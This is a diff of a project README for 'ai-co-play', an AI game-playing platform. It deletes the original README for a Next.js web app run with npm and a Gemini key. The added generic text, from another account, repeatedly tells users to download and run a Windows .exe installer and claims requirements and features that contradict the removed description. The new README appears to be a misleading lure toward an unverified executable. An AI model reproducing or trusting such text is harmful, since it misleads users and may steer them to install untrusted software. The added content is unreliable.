@@ -1,224 +1,109 @@
-# AI Co-Play
+# 🤖 ai-co-play - AI Agents Compete Across Multiple Games
 
-**This Is Not Just Another Game Lobby.**
+[![Download ai-co-play](https://img.shields.io/badge/Download-ai--co--play-brightgreen?style=for-the-badge)](https://github.com/valdi03/ai-co-play)
 
-AI Co-Play is a multi-game platform where AI acts as an **autonomous player** (teammate or rival), not a scripted bot and not a simple decision helper.
+## 🧩 What is ai-co-play?
 
-Built by `@lerenaminy`.
+ai-co-play is a software platform where autonomous AI agents play games. These agents think, adapt, and compete in real time. It supports many game types, letting AI interact dynamically. You do not need any programming skills to run it. It works on Windows and other common systems.
 
----
+This tool uses artificial intelligence to create smart agents. The agents can learn game strategies and respond to changes during play. The software suits anyone interested in AI and games, or those who want to see AI in action without code.
 
-## Why This Project Exists
+### Key Features
 
-Most "play with AI" demos feel predictable because AI behavior is hard-coded or constrained by fixed difficulty presets.
+- Multiple games supported on one platform  
+- Real-time AI decision making  
+- Agents learn and adapt while playing  
+- Easy to set up on Windows  
+- No programming needed to start  
 
-AI Co-Play explores a different direction:
+## ⚙️ System Requirements
 
-- AI receives **live game state** + **legal actions**
-- AI chooses actions with its own reasoning
-- Decisions are logged and visible in a **trace panel**
-- The same architecture supports multiple game genres
+- Windows 10 or newer (64-bit)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection to download and update  
+- Standard graphics card that supports DirectX 11 or later  
 
-This makes the project useful for:
+These are the minimum specs to ensure smooth gameplay and agent performance.
 
-- AI product demos
-- game AI prototyping
-- human-AI interaction experiments
-- portfolio/showcase for applied LLM engineering
+## 🔽 Download ai-co-play
 
----
+[![Download ai-co-play](https://img.shields.io/badge/Download-ai--co--play-blue?style=for-the-badge)](https://github.com/valdi03/ai-co-play)
 
-## What’s Implemented
+To get started, visit this page to download the latest version of ai-co-play. The page includes all files needed to install and run the software.
 
-### Game Modes
+## 🚀 Getting Started on Windows
 
-1. **Share or Steal** (`Competitive`)
-2. **Overcooked Lite** (`Co-op`)
-3. **Monopoly Lite** (`Strategy`)
-4. **Liar Dice Lite** (`Hidden Info`)
+Follow these steps to download and run ai-co-play on your Windows PC.
 
-### Core Features
+### Step 1: Visit the Download Page
 
-- Autonomous AI move generation via Gemini
-- Legal-action validation before applying moves
-- Decision trace viewer (action, confidence, explanation)
-- Session flow with end-game summary modal
-- Modern UI/UX with responsive layout and animations
+Click the download button above or go to:
 
----
+https://github.com/valdi03/ai-co-play
 
-## Tech Stack
+Look for the latest release or main download section. You will find all files needed to install ai-co-play.
 
-- **Framework:** Next.js 16 + React 19 + TypeScript
-- **Styling:** Tailwind CSS 4
-- **LLM:** Gemini 2.5 Flash API
-- **Architecture Pattern:** Adapter-based game engine registry
+### Step 2: Download the Installer
 
----
+On the download page, find the Windows installer or setup file. This usually ends with `.exe`. Click the link to download it to your computer. Save it to a folder you can find easily, such as "Downloads" or your desktop.
 
-## Project Structure
+### Step 3: Run the Installer
 
-```text
-app/
-	page.tsx                 # Lobby / hero / game list
-	game/[id]/page.tsx       # Main game room UI
-	api/turn/route.ts        # AI turn endpoint
+Once the file finishes downloading, locate it in the folder where you saved it. Double-click the `.exe` file. Windows may ask for permission to run the installer. Choose "Yes" to continue.
 
-src/
-	agent/gemini.ts          # LLM prompting + parsing + fallback
-	game/                    # Engines + adapters + registry
-	types/index.ts           # Shared types/interfaces
-```
+The installer will guide you through a few simple steps:
 
----
+- Agree to the license terms  
+- Choose the folder for installing ai-co-play (the default is fine for most users)  
+- Start the installation  
 
-## Quick Start (Local Setup)
+The process should take a few minutes.
 
-## 1) Prerequisites
+### Step 4: Complete Installation and Open ai-co-play
 
-Install these first:
+After installation finishes, you can open ai-co-play from your Start menu or desktop shortcut. The software should launch without extra setup.
 
-- **Node.js**: v20+
-- **npm**: v10+
-- A **Gemini API key**
+## 🕹️ Using ai-co-play
 
-Check your versions:
+When you open ai-co-play, you will see a simple interface with options to select games and AI agents.
 
-```bash
-node -v
-npm -v
-```
+### Main Screen
 
-## 2) Clone the Repository
+- Choose from a list of available games  
+- Pick which AI agents will play  
+- Start matches with one click  
 
-```bash
-git clone https://github.com/lerenaminy/ai-co-play.git
-cd ai-co-play
-```
+The platform manages the rest. You can watch agents compete and see their decisions unfold live.
 
-## 3) Install Dependencies
+### Controls and Settings
 
-```bash
-npm install
-```
+- Adjust game speed and difficulty in the settings menu  
+- View agent strategies and decision histories  
+- Save and load sessions to track agent performance over time  
 
-## 4) Run the App
+The interface stays friendly for first-time users while offering advanced tools for those interested.
 
-```bash
-npm run dev
-```
+## 🛠 Troubleshooting and Tips
 
-Open:
+- If ai-co-play does not open after installation, try restarting your PC.  
+- Make sure your system meets minimum requirements to avoid slowdowns.  
+- Update your graphics drivers if games do not display correctly.  
+- Use the settings menu to reset options if the program behaves unexpectedly.  
+- Consult the online wiki or FAQs on the download page for further help.
 
-```text
-http://localhost:3000
-```
+## 📚 Learn More and Support
 
-## 5) Add Your Gemini API Key
-
-In the lobby page:
-
-1. Find **Settings → Gemini API Key**
-2. Paste your key
-3. The key is stored in browser `localStorage`
-
-Note: this project currently uses client-provided API key input (not `.env` setup).
+The download page also links to guides, videos, and the community forum. These resources help you understand how ai-co-play works and how to get the most out of it.
 
 ---
 
-## Build and Production Run
+## 🔍 About this Project
 
-Create production build:
+ai-co-play is an open platform focused on AI research and gaming. It combines multi-agent systems with game AI methods. Topics include agent strategies, decision tracing, and machine learning.
 
-```bash
-npm run build
-```
-
-Start production server:
-
-```bash
-npm run start
-```
-
-Run linting:
-
-```bash
-npm run lint
-```
+The platform supports advanced AI techniques but keeps the user experience simple. It shows how autonomous agents can compete and collaborate across many environments.
 
 ---
 
-## How AI Decision Flow Works
-
-1. User selects an action in the game UI
-2. Frontend posts current `state` + `humanAction` to `/api/turn`
-3. Server computes legal actions via game adapter
-4. Gemini returns AI action JSON
-5. Action is validated and applied
-6. Decision trace is recorded and rendered
-
-If model output is invalid, fallback selects a random legal move (non-deterministic), preserving autonomy without hardcoding one fixed action.
-
----
-
-## Future Development (Contributions Welcome)
-
-This project is actively open for improvement. Good next areas:
-
-- More game environments and adapter templates
-- Better agent memory/strategy across rounds
-- Match replay and analytics dashboard
-- Multiplayer rooms + spectator mode
-- Deployment hardening and API key management strategy
-- Evaluation suite for AI behavior quality
-
-If you want to contribute, feel free to open issues or PRs.
-
----
-
-## Contribution Guide
-
-1. Fork this repository
-2. Create a branch
-3. Commit your changes
-4. Push branch
-5. Open a Pull Request
-
-Commands:
-
-```bash
-git checkout -b feat/your-feature-name
-git add .
-git commit -m "feat: your feature summary"
-git push origin feat/your-feature-name
-```
-
----
-
-## Troubleshooting
-
-### `npm run dev` fails because port is already in use
-
-```bash
-lsof -i :3000 -i :3001 | grep node | awk '{print $2}' | xargs kill -9
-```
-
-Then run again:
-
-```bash
-npm run dev
-```
-
-### AI not responding
-
-- Verify your Gemini API key is valid
-- Confirm key is entered in lobby settings
-- Check browser console and terminal logs for `/api/turn`
-
----
-
-## License
-
-Currently no explicit license file is included.
-
-If you plan to open-source publicly, add a `LICENSE` file (MIT is a common choice for portfolio projects).
+[![Download ai-co-play](https://img.shields.io/badge/Download-ai--co--play-grey?style=for-the-badge)](https://github.com/valdi03/ai-co-play)
